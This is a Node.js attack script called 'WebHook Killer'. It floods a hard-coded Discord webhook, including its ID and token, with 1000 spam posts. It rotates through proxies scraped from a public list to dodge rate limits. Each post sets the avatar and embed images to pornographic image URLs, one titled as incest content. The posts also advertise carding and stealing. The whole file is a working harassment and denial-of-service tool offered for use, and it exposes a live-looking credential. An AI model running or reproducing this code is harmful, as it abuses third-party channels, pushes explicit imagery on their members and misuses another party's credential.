//WebHook Killer Programado pelo Korobeiniki, Caso Modifique o Código, Não Esqueça de Deixar os Créditos ~ Github: https://github.com/Korobeiniki17
//WebHook Killer Programmed by Korobeiniki, If you change the code, don't forget to leave the credits ~ Github: https://github.com/Korobeiniki17
const { randomInt } = require('crypto'); //Crypto Lib
const fetch = require('node-fetch'); //Node Fetch Lib
const HttpsProxyAgent = require('https-proxy-agent'); //HttpProxy Agent Lib
const colors = require('colors'); //Colors Lib
const fs = require("fs"); //FileSystem Lib
const debug = false; //Switch Debug Mode
const proxyList = ['geonode', 'list', 'all'] //Array of Proxy Method
const proxySelect = "geonode"; //Select Your Proxy Method
const discord = require('discord.js'); //Discord JS Lib

function saveFile(file, string){
  fs.appendFileSync(file, string, function (err) {
      if (err){
        if (debug){
          console.log(err);
        }
      }
    });
}

function filter_list(file, proxy){
  try {
      let data = fs.readFileSync(file, 'utf8');
      if(!data.includes(proxy)){
        saveFile(file, proxy + "\n")
      }
  } catch (e) {
      console.log('Error:', e.stack)
  }
}

function listProxy(){
  return new Promise((resolve, reject) => {
    fs.readFile("koro_proxys.txt", function (err, data){
      if (err){
        reject(err);
      }else{
        const proxy = data.toString().split("\n")[randomInt(0, data.toString().split("\n").length -1)]
        resolve(proxy)
      }
    })
  })
}

function geonodeProxy(){
  return fetch("https://proxylist.geonode.com/api/proxy-list?limit=10000&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=100&protocols=http%2Chttps", {
    "headers": {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
      "cache-control": "no-cache",
      "pragma": "no-cache",
      "sec-ch-ua": "\"Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "document",
      "sec-fetch-mode": "navigate",
      "sec-fetch-site": "same-site",
      "sec-fetch-user": "?1",
      "upgrade-insecure-requests": "1",
      "cookie": "_gcl_au=1.1.389486121.1631058148; _rdt_uuid=1631058148007.50cff3fe-3fb8-4fad-94e2-5ace1d619813; _ga_ZDN3X5YQDJ=GS1.1.1631058147.1.0.1631058147.60; _ga=GA1.1.92542295.1631058148; _uetsid=42d45b50103511ec90f4d78b24b587bf; _uetvid=42d4b5c0103511ec963075178b3e6711; _hjid=88e38b28-4772-47f6-a98e-03c6ac6aee8f; _hjFirstSeen=1; prism_611232746=ec42052d-b965-4019-87bd-6fe5c393facd; _hjAbsoluteSessionInProgress=1; intercom-id-ruz1xgns=86910a47-1fe6-4d06-8d66-37aa9fc81f9a; intercom-session-ruz1xgns="
    },
    "referrer": "https://geonode.com/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": null,
    "method": "GET",
    "mode": "cors"
  }).then(res => res.json()).then((json) => {
      var c = randomInt(0, json.data.length)
      var result = json.data[c].ip + ":" + json.data[c].port;
      return result;
  });
}

const getProxy = () => {
  if (proxySelect == "geonode"){
    return geonodeProxy();
  }else if(proxySelect == "list"){
    return listProxy();
  }else if(proxySelect == "all"){
    if (randomInt(0, 1) == 0){
      return geonodeProxy();
    }else{
      return listProxy();
    }
  }
  
}

var webhook = {
  "id":"885256141943214171",
  "token":"pKcfLlLKBfoMQwEMM16djBjeCp0Tt2lMOFeGSwCXNzffKQjjA5UvEM5yYgoBbz8-jifZ"
};
//https://discord.com/api/webhooks/885256141943214171/pKcfLlLKBfoMQwEMM16djBjeCp0Tt2lMOFeGSwCXNzffKQjjA5UvEM5yYgoBbz8-jifZ
var URL = `https://discord.com/api/webhooks/${webhook.id}/${webhook.token}`;

function makeid(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) { 

    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
function send(params){
  getProxy().then(proxy => {
    (async () => {
      //console.log(proxy)
      const proxyAgent = new HttpsProxyAgent('http://' + proxy);
      var response = await fetch(URL, { 
        method: "POST",
        agent: proxyAgent,
        headers: {
          'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
      }).then(cu =>{
        const status = cu.status;
        const statusText = cu.statusText;
        if (status == 204){
          console.log("[+]".green + " " + proxy + " Fucked Sucess")
          filter_list("koro_proxys.txt", proxy)
        }else{
          console.log("[!]".yellow + " " + proxy +  " Information Status: " + statusText + " (" + status + ")")
        }
        //console.log(body + " BODY");
      }).catch(err =>{
        console.log("[-]".red + " " + proxy + " (" + err.code + ")");
        send(params);
      });
    })();
    //console.log(proxy);
  }).catch(err =>{
    if (debug){
      console.log("[-]".red + " Failed to Connect to Proxy List (" + err + ")")
    }
  })
}


for(i = 0;i<1000;i++){
  var fucked = ["http://xvidios.xxx/wp-content/uploads/2020/04/Xxx-porno-300x185.jpg", "https://www.cnnamador.com/contents/videos_screenshots/221000/221063/preview.jpg", "https://xvideostop.org/wp-content/uploads/2020/10/Porn%C3%B4-Incesto-Pai-E-Filha-No-Banheiro-Segredos.jpg"];
  var f = fucked[randomInt(0, fucked.length)]
  
  var params = {
    username: "Koro Was Here",
    avatar_url: f,
    content: "0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x" + makeid(12) + " 0x",
    embeds: [
        {
            "title": "Korobeiniki Was Here",
            "color": 15258703,
            "thumbnail": {
                "url": f,
            },
            "image": {
                "url": f,
            },
            "fields": [
                {
                    "name": "Copia Não BB",
                    "value": "Credit Card, Hacking, Carding, Stealing",
                    "inline": true
                }
            ]
        }
    ]
  }
  send(params);
  
}
  

